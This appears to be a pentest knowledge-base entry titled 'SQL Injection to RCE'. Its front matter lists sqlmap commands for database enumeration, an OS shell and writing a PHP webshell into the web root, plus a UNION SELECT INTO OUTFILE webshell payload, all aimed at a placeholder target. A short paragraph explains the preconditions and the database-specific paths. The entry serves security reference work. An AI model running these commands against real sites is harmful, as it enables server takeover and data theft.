---
id: init-004
title: "SQL Injection to RCE"
category: initial_access
tags: [sqli, sql-injection, rce, sqlmap, webshell, outfile]
platform: [linux, windows]
commands:
  - "sqlmap -u 'https://target.example.com/search?q=1' --dbs --batch"
  - "sqlmap -u 'https://target.example.com/page?id=1' --os-shell --batch"
  - "sqlmap -u 'https://target.example.com/page?id=1' --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php"
  - "' UNION SELECT '' INTO OUTFILE '/var/www/html/webshell.php'-- -"
references:
  - "https://book.hacktricks.xyz/pentesting-web/sql-injection"
  - "https://github.com/sqlmapproject/sqlmap"
---

SQL injection vulnerabilities in web applications can escalate from data exfiltration to full remote code execution when the database user has `FILE` privileges and the web server's document root is writable, enabling the `SELECT INTO OUTFILE` technique to write a PHP webshell to disk. SQLMap automates this process with its `--os-shell` option, which attempts to upload an interactive shell via multiple methods including `INTO OUTFILE`, UDF loading, and xp_cmdshell on MSSQL databases. Successful exploitation depends on the database type (MySQL, MSSQL, PostgreSQL each have different RCE paths), the privilege level of the DB user, and OS-level file permission configurations.
